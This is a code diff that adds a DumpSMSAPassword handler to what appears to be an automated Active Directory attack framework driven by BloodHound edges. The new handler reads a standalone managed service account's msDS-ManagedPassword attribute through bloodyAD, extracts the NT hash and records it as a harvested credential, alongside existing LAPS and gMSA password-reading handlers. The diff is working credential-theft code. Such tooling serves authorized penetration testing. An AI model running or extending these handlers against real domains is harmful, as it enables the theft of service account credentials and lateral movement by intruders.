@@ -1,7 +1,8 @@
 """Credential-reading edge exploitation handlers.
 
-Handles ReadLAPSPassword and ReadGMSAPassword edges -- both are read-only
-operations that extract stored credentials from AD attributes.
+Handles ReadLAPSPassword, ReadGMSAPassword, and DumpSMSAPassword edges --
+all are read-only operations that extract stored credentials from AD
+attributes.
 """
 
 from __future__ import annotations
@@ -215,4 +216,68 @@ class ReadGMSAHandler(BaseEdgeHandler):
         if match:
             return match.group(1).lower()
 
+        return None
+
+
+@register_handler("DumpSMSAPassword")
+class DumpSMSAPasswordHandler(BaseEdgeHandler):
+    """Handles DumpSMSAPassword edges.
+
+    Reads the standalone Managed Service Account (sMSA) password from the
+    target's ``msDS-ManagedPassword`` attribute via bloodyAD and derives
+    the NT hash.  Functionally identical to gMSA password reading.
+    """
+
+    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
+        target_type = edge.target.label.lower()
+        if target_type not in {"user", "computer"}:
+            return False, f"DumpSMSAPassword requires a User or Computer target, got {edge.target.label}"
+        return True, f"Can read sMSA password for {edge.target.name}"
+
+    async def exploit(
+        self, edge: EdgeInfo, dry_run: bool = False
+    ) -> tuple[bool, str, list[Credential]]:
+        principal = self._resolve_principal(edge)
+        target = self._resolve_target(edge)
+        auth_args = self._get_auth_args(principal)
+        domain = self._get_domain()
+
+        if dry_run:
+            return (
+                True,
+                f"[DRY RUN] Would read sMSA password for {target}",
+                [],
+            )
+
+        self.logger.info("Reading sMSA password for %s", target)
+        result = await bloody.read_gmsa(self.config, auth_args, target)
+
+        if not result["success"]:
+            return (
+                False,
+                f"Failed to read sMSA password for {target}: {result.get('error', 'unknown')}",
+                [],
+            )
+
+        nt_hash = ReadGMSAHandler._extract_gmsa_hash(result)
+
+        if not nt_hash:
+            return (
+                False,
+                f"sMSA attribute read succeeded but could not extract NT hash for {target}",
+                [],
+            )
+
+        cred = Credential(
+            cred_type=CredentialType.nt_hash,
+            value=nt_hash,
+            username=target,
+            domain=domain,
+            obtained_from=f"sMSA password read from {target}",
+        )
+
+        self.logger.info("sMSA NT hash retrieved for %s", target)
+        return True, f"sMSA NT hash read for {target}", [cred]
+
+    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
         return None
